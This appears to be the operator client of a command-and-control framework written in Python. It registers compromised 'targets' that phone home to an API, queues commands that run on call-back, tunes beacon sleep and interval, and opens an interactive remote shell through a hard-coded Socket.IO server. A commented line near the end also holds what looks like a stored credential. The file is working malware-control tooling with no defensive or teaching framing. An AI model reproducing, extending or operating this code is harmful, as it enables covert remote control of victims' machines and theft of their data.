import base64
import json
import pprint
import random
import threading
import datetime
from time import sleep
import concurrent.futures
import utility
import socketio
import threading
import time
import utility as util

# Connect to the Flask-SocketIO server
sio = socketio.Client()

# Event to notify when a message is received
message_received_event = threading.Event()

# Variable to store the received message
received_message = None



@sio.event
def connect():
    print('Connected to server')

@sio.event
def disconnect():
    print('Disconnected from server')

def handle_message_meta(msg):
    @sio.on(msg)
    def handle_message(data):
        global received_message
        received_message = data
        message_received_event.set()

# Connect to the server
sio.connect('http://192.168.2.196:8000/')

# Wait for a brief moment to ensure the connection is established
time.sleep(1)

#always get configs set.
lc = utility.LIGHT_CYAN
wh = utility.WHITE
yl = utility.YELLOW
rs = utility.WHITE

class Target:
    def __init__(self, _ip, _st, _dmp, _in, _out, _lp, _isid, _zzz, _n,_id):
        self._ip = _ip
        self._st = _st
        self._dmp = _dmp
        self._in = _in
        self._out = _out
        self._lp = _lp
        self._id = _id  # Auto-incremented primary key
        self._isid = _isid
        self._zzz = _zzz
        self._n = _n


    def help(self):
        print(f'\n{lc}Commands{wh}:{rs}')
        print(f'\n{utility.LIGHT_GREEN}prompt{wh} mode set to true will prompt you on command line. set it to false and pass your argumenet to automate it.')
        print(f'\n\t{lc}target{yl}.__str__{wh}(self):{rs}')
        print(f'\n\t{lc}target{yl}.dump{wh}(self):{rs}')
        print(f'\n\t{lc}target{yl}.getisid{wh}(self):{rs}')
        print(f'\n\t{lc}target{yl}.command{wh}(self,command=None):{rs}')
        print(f'\n\t{lc}target{yl}.sleep{wh}(self,prompt=False,num=0):{rs}')
        print(f'\n\t{lc}target{yl}.interval{wh}(self,prompt=False,num=0):{rs}')
        print(f'\n\t{lc}target{yl}.shell{wh}(self):{rs}')
        print(f'\n\t{lc}target{yl}.help{wh}(self):{rs}')
        
    def dump(self):
        print(self._dmp.replace('\\n','\n').replace('\\r','\r'))

    def to_json(self):

            # Create a dictionary representation of the object
            obj_dict = {
                "_ip": self._ip,
                "_st": self._st,
                "_dmp": self._dmp,
                "_in": self._in,
                "_out": self._out,
                "_lp": self._lp,
                "_id": self._id,
                "_isid": self._isid,
                "_zzz": self._zzz,
                "_n": self._n
            }

            # Convert the dictionary to JSON
            return json.dumps(obj_dict)

    def __str__(self):
        return utility.color(self.to_json(),f'{utility.get_random_color()}')
     
    def getisid(self):
        return self._isid


    def command(self,command=None):
        #test function set an integer input to the database. 
        self._st = 0
        if command is None: 
            self._in = utility.getinput(f'{utility.YELLOW}enter command:{utility.RESET}')
        else :
            self._in = command
        issue_command(self.__dict__)      
        return ''
    
    def sleep(self,prompt=False,num=0):
        if prompt:
            send_sleep(
                self._isid,
                self._id,
                util.get_integer_input(f'{utility.YELLOW}enter Sleep:{utility.RESET}'),
                True
                )
        else:
            send_sleep(
                self._isid,
                self._id,
                num,
                True
                )
            
    def interval(self,prompt=False,num=0):
        if prompt:
                input = util.get_integer_input(f'{utility.YELLOW}enter interval:{utility.RESET}')
                if input < 99 :
                    print(f'{utility.RED} interval in miliseconds must atleast be over 100. defaulting to 500. {utility.RESET}')
                send_sleep(
                    self._isid,
                    self._id,
                    input,
                    False
                    )
        else:
                if num < 99 :
                    print(f'{utility.RED} interval in miliseconds must atleast be over 100. defaulting to 500. {utility.RESET}')
                send_sleep(
                    self._isid,
                    self._id,
                    num,
                    False
                    )
                

    def shell(self):
    # Keep the client running
        try:
            while True:

                x = util.getinput(f'{util.YELLOW}Command:{util.LIGHT_CYAN} ')
                #if x is x quit homie
                if x == 'x':
                    sio.disconnect()
                    exit()
                obj = {'_isid':f'{self._isid}','_id':f'{self._id}','_msg':f'{x}'}
                handle_message_meta(f'{self._isid}')
                # Send a message to the server
                sio.emit(f'isid',json.dumps(obj))

                # Wait until a message is received or a timeout occurs (e.g., 10 seconds)
                if message_received_event.wait(timeout=10):
                    print(f'{util.RESET}', str(received_message).replace('\\n','\n').replace('\\r','\r'))
                    message_received_event.clear()
                else:
                    print('Timeout: No message received within the specified time.')

        except KeyboardInterrupt:
            # Disconnect when the client is interrupted (e.g., Ctrl+C)
            sio.disconnect()

        
        


def update_record(target, record_id):
    formatted_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-4]
    target.updatesinglerecordbyid(str(record_id), "_lp", formatted_time)
    sleep_duration = random.uniform(0.5, 2.0)  # Random sleep duration between 0.5 and 2.0 seconds
    sleep(sleep_duration)

def UpdateTime ():
    threads = []
    record_ids = []
    while True :
        t = getallrecords()
        for i in t:
            record_ids.append(i["_id"])

        for records in record_ids:
            thread = threading.Thread(target=update_record, args=(target, records))
            threads.append(thread)
            thread.start()

            # Wait for all threads to complete
            for thread in threads:
                thread.join()
        record_ids = []

config_editable_obj = {
    "_session_len": "",
    "_theme": "",
    "_title": "",
    "_host_name": "",
    "_ip_address": "",
    "_port": ""
}

instance_editable_obj =  {"_instance_name":"",
"_instance_ip":"",
"_instance_url":""}

def display_menu_config():
    print("1. Update _session_len")
    print("2. Update _theme")
    print("3. Update _title")
    print("4. Update _host_name")
    print("5. Update _ip_address")
    print("6. Update _port")
    print("0. save")

def display_menu_instance():
    print("1. Update _instance_name")
    print("2. Update _instance_ip")
    print("3. Update _instance_url")
    print("0. save")


def update_value(key, value):
    con[key] = value
    print(f"{key} updated to: {value}")

def update_value_instances(key, value):
    listofInstance[0][key] = value
    print(f"{key} updated to: {value}")

def update_config():
    while True:
        display_menu_config()
        choice = input("Enter your choice (0-6): ")
        if choice == "0":
            print("Exiting the program.")
            break
        elif choice in ["1", "2", "3", "4", "5", "6"]:
            key = list(config_editable_obj.keys())[int(choice) - 1]
            value = input(f"Enter the new value for {key}: ")
            update_value(key, value)
        else:
            print("Invalid choice. Please enter a number between 0 and 6.")
         
def update_Instance():
    while True:
        display_menu_instance()
        choice = input("Enter your choice (0-4): ")
        if choice == "0":
            print("Exiting the program.")
            break
        elif choice in ["1", "2", "3", "4"]:
            key = list(instance_editable_obj.keys())[int(choice) - 1]
            value = input(f"Enter the new value for {key}: ")
            update_value_instances(key, value)
        else:
            print("Invalid choice. Please enter a number between 0 and 6.")

def modify():
    #update_config()
    update_Instance()
    utility.colorize(json.loads(core),utility.RED,utility.BLUE)
    updated_con = { key:con[key] if  key in con  else value for key, value in con.items()}
    updateliInstances = []
    for i in  listofInstance:
        updateliInstances.append( { key:i[key] if  key in i  else value           
                            for key, value in i.items()})
    jcore =  json.loads(core)
    jcore['_config'] = updated_con
    jcore['_instances'] = updateliInstances
    utility.colorize(jcore,utility.RED,utility.BLUE)
    print(f"{utility.YELLOW}******************* UPDATED *******************{utility.RESET}")
    utility.colorize(jcore,utility.RED,utility.BLUE)
    print(f"{utility.GREEN}******************* SAVED *******************{utility.RESET}\n\n")
    utility.colorize(json.loads(utility.syncCore(json.dumps(jcore))),utility.GREEN,utility.YELLOW)

def load_targets():
    print(listofInstance) 


def send_sleep(_isid,_id, sleep,isinterval):
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }
        inter =''
        if isinterval :
            inter='true'
        else:
            inter='false'
        # Send a GET request to retrieve the record by ID
        response = utility.requests.get(f'{utility.host}/{_isid}/{_id}/{sleep}/{inter}/z',headers=headers)
        # Check the response status code
        print(response)
        if response.status_code == 200:
            # Parse the JSON response and return the record dataif 
            record_data = response.text
            return record_data
        elif response.status_code == 404:
            return 'Record not found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'


def set_interval(_isid,_id, sleep):
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }
      
        # Send a GET request to retrieve the record by ID
        response = utility.requests.get(f'{utility.host}/{_isid}/{_id}/{sleep}/i',headers=headers)
        # Check the response status code
        print(response)
        if response.status_code == 200:
            # Parse the JSON response and return the record data
            record_data = response.text
            
            return record_data
        elif response.status_code == 404:
            return 'Record not found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'
    


#NEW-CLI
def get_targets(isid):
    try:
        print(isid)
        headers = {
            'authtok': f'{utility.authtok}'
        }
        # Send a GET request to retrieve the record by ID
        response = utility.requests.get(f'{utility.host}/{utility.coreprefix}/{isid}/gt',headers=headers)
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the record data
            record_data = response.text
            return record_data
        elif response.status_code == 404:
            return 'Record not found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'
#NEW-CLIc
def issue_command(target):
    try:
        headers = {
            'authtok': f'{utility.authtok}',
            'Content-Type': 'application/json'
        }

        # Send a GET request to retrieve the record by ID
        response = utility.requests.post(f'{utility.host}/{utility.coreprefix}/{target["_isid"]}/c',headers=headers,data=json.dumps(target))
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the record data
            record_data = response.json()
            return record_data
        elif response.status_code == 404:
            return 'Record not found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'


def get_output(target):
    try:
        headers = {
            'authtok': f'{utility.authtok}',
        }
        print()
        # Send a GET request to retrieve the record by ID
        response = utility.requests.get(f'{utility.host}/{target["_isid"]}/{target["_id"]}/go')
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the record data
            record_data = response.text
            return record_data
        elif response.status_code == 404:
            return 'Record not found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'



def getrecordbyid(_id):
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }
        # Send a GET request to retrieve the record by ID
        response = utility.requests.get(f'{utility.host}/{utility.coreprefix}/t/{_id}',headers=headers)
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the record data
            record_data = response.json()
            return record_data
        elif response.status_code == 404:
            return 'Record not found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'

def deleterecordbyid(_id):
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }
        # Construct the API endpoint URL for deleting a record by its ID
        endpoint_url = f'{utility.host}/{utility.coreprefix}/t/{_id}'
        # Send HTTP DELETE request to the endpoint
        response = utility.requests.delete(endpoint_url,headers=headers)
        # Check the response status code and handle accordingly
        if response.status_code == 200:
            print('Record deleted successfully.')
        elif response.status_code == 404:
            print('Record not found.')
        else:
            print('Failed to delete record. Server returned status code:', response.status_code)

    except Exception as e:
        print(f"Error: {e}")

def getrecordsbyfield(_field, value):
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }
        # Send a GET request to retrieve records based on the specified field and value
        response = utility.requests.get(f'{utility.host}/{utility.coreprefix}/t/{_field}/{value}',headers=headers)
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the records data as a list of dictionaries
            records_data = response.json()
            return records_data
        elif response.status_code == 404:
            return 'No records found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'

    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'

def insertrecord(_st,_dmp, _ip, _in, _out, _lp,_isid,_zzz,_n):
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }
        # Prepare data as a dictionary
        data = {
            '_st':_st,
            '_dmp': _dmp,
            '_ip': _ip,
            '_in': _in,
            '_out': _out,
            '_lp': _lp,
            '_isid':_isid,
            '_n':_n,
            '_zzz:':_zzz
        }
        # Send a POST request to insert the record
        response = utility.requests.post(f'{utility.host}/{utility.coreprefix}/t', json=data,headers=headers)
        # Check the response status code and return the result
        if response.status_code == 200:
            return 'Record inserted successfully.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'

def updatemanyrecordsbyfield(_field, _value):
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }
        # Construct the complete API endpoint URL
        endpoint_url = f'{utility.host}/{utility.coreprefix}/t/{_field}/{_value}'
        # Send a PUT request to update records based on the specified field and new value
        response = utility.requests.put(endpoint_url,headers=headers)
        # Check the response status code and return the result
        if response.status_code == 200:
            return 'Records updated successfully.'
        elif response.status_code == 404:
            return 'No records match the criteria.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'

def getallrecords():
    try:
        headers = {
            'authtok': f'{utility.authtok}'
        }        
        # Send a GET request to retrieve all records
        response = utility.requests.get(f'{utility.host}/{utility.coreprefix}/t/all',headers=headers)
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the records data as a list of dictionaries
            records_data = response.json()
            return records_data
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'

def updatesinglerecordbyid(_id,_field,_input):
    headers = {
            'auth': 'value'
        }     
    utility.requests.get(f'{utility.host}/{utility.coreprefix}/t/{_id}/{_field}/{_input}',headers=headers)
    return True



def getinstancebyid(_id):
    try:
        headers = {
        "Content-Type": "application/json",
        'authtok': f'{utility.authtok}'
        }
        # Send a GET request to retrieve the record by ID
        response = utility.requests.get(f'{utility.host}/{utility.coreprefix}/i/{_id}',headers=headers)
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the record data
            record_data = response.json()
            return record_data
        elif response.status_code == 404:
            return 'Record not found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'

    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'
    
def getinstancebyfield(_field, value):
    try:
        headers = {
        "Content-Type": "application/json",
        'authtok': f'{utility.authtok}'
        }
        # Send a GET request to retrieve instance based on the specified field and value
        response = utility.requests.get(f'{utility.host}/{utility.coreprefix}/i/{_field}/{value}',headers=headers)
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the instance data as a list of dictionaries
            instance_data = response.json()
            return instance_data
        elif response.status_code == 404:
            return 'No instance found.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'

def insertinstance(_instance_name, _instance_ip, _instance_url, _Instance_count):
    # Data to be sent in the POST request

    data = {
        "_instance_name": _instance_name,
        "_instance_ip": _instance_ip,
        "_instance_url": _instance_url,
        "_Instance_count": _Instance_count
    }
    # Convert the data dictionary to JSON format
    json_data = utility.json.dumps(data)
    # Set the headers to indicate that the data being sent is in JSON format
    headers = {
        "Content-Type": "application/json",
        'authtok': f'{utility.authtok}'
    }
    try:
        # Send a POST request to the endpoint
        response = utility.requests.post(f'{utility.host}/{utility.coreprefix}/i', data=json_data, headers=headers)
        # Check the response status code
        if response.status_code == 201:
            print(utility.color('Successfully inserted',utility.GREEN))
        else:
            print(utility.color('Failed to insert record.',utility.RED)+"Status code:", response.status_code)
    except utility.requests.exceptions.RequestException as e:
        print("Error:", e)

def getallinstances():
    try:
        headers = {
        "Content-Type": "application/json",
        'authtok': f'{utility.authtok}'
        }
        # Send a GET request to retrieve all instance
        response = utility.requests.get(f'{utility.host}/{utility.coreprefix}/i/all',headers=headers)
        # Check the response status code
        if response.status_code == 200:
            # Parse the JSON response and return the instance data as a list of dictionaries
            instance_data = response.json()
            return instance_data
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'

def deleteinstancebyid(_id):
    try:
        headers = {
        "Content-Type": "application/json",
        'authtok': f'{utility.authtok}'
        }
        # Construct the API endpoint URL for deleting a record by its ID
        endpoint_url = f'{utility.host}/{utility.coreprefix}/i/{_id}'
        # Send HTTP DELETE request to the endpoint
        response = utility.requests.delete(endpoint_url,headers=headers)
        # Check the response status code and handle accordingly
        if response.status_code == 200:
            print('Record deleted successfully.')
        elif response.status_code == 404:
            print('Record not found.')
        else:
            print('Failed to delete record. Server returned status code:', response.status_code)
    except Exception as e:
        print(f"Error: {e}")

def updatemanyinstancebyfield(_field, _value,_new_value):
    try:
        headers = {
        "Content-Type": "application/json",
        'authtok': f'{utility.authtok}'
        }
        # Construct the complete API endpoint URL
        endpoint_url = f'{utility.host}/{utility.coreprefix}/i/{_field}/{_value}/{_new_value}'
        # Send a PUT request to update instance based on the specified field and new value
        response = utility.requests.put(endpoint_url,headers=headers)
        # Check the response status code and return the result
        if response.status_code == 200:
            return 'Records updated successfully.'
        elif response.status_code == 404:
            return 'No instance match the criteria.'
        elif response.status_code == 500:
            return 'Internal server error occurred.'
        else:
            return f'Unexpected response: {response.status_code}'
    except utility.requests.exceptions.RequestException as e:
        return f'Error: {e}'
    
def updatesingleInstancebyid(_id,_field,_input):
    headers = {
    "Content-Type": "application/json",
    'authtok': f'{utility.authtok}'
    }
    return utility.requests.get(f'{utility.host}/{utility.coreprefix}/i/{_id}/{_field}/{_input}',headers=headers)


def createtarget():
    _ip = input(f"{utility.RED}Enter IP (the api the target will phone home to):{utility.RESET}")
    _in = input("Enter cmd (will execute on call back): ")
    _zzz = input(f"{utility.YELLOW}Enter interval:{utility.RESET} ")
    _n = input("Enter name:(optional) ")
    insertrecord(_ip = _ip,_st = -1,_dmp = '',_in = _in,_out = '',_lp = '',_isid ='' ,_zzz = _zzz,_n = _n)


def showinstances():
    for index, instance in enumerate(listofInstance):
        print(f'{utility.YELLOW}{index}{utility.RESET}:'+' name: '+instance['_instance_name']+' ')

#start the actual client logic.
def getTargetByInstanceSelectionIndex(selection):
    if not isinstance(selection,int):
        print( f'{utility.RED}Use showinstances(): to get an index{utility.RESET}' )
        return None
    # for index, instance in enumerate(listofInstance):
    #     print(f'{utility.YELLOW}{index}{utility.RESET}:'+' name: '+instance['_instance_name']+' ')
    # selection = utility.get_integer_input(f'{utility.RED}select instances to get targets from:{utility.RESET}')
    InstanceTargets = (get_targets(listofInstance[selection]['_instance_id']))
    return json.loads(InstanceTargets)
    #pprint.pprint(get_targets(listofinstances[selection]))

def settarget(TargetsJson):
    for i in TargetsJson:
        InstanceTargets.append(Target(_ip=i['_ip'], _st=i['_st'], _dmp=i['_dmp'], _in=i['_in'], _out=i['_out'], _lp=i['_lp'], _isid=i['_isid'], _zzz=i['_zzz'], _n=i['_n'],_id=i['_id']))

def printtargets(): 
    if len(InstanceTargets) == 0 :  
        print(f'no records loaded. Try using - {utility.YELLOW}settarget(getTargetByInstanceSelectionIndex(4)){utility.RESET}') 
        return
    for i in InstanceTargets : 
        print(i)

def setinstancetargets(index):
    settarget(getTargetByInstanceSelectionIndex(index))

utility.readconfig()
core = utility.logintest()
con = core['_config']
listofInstance = core['_instances']
InstanceTargets = []
#("super", "user", "26f713dd-4ab9-4b65-88c4-ac2792240afe")


"""
typedef enum {
	/*Command	*/ CO = 0,  // (?)
	/*Sleep		*/ SL = 1,  // {?}
	/*Kill		*/ KI = 2,  // [X]
	/*listen    */ LI = 3,	// |?|
	/*Error		*/ ER = -1  // <x>
} Inputs; 
"""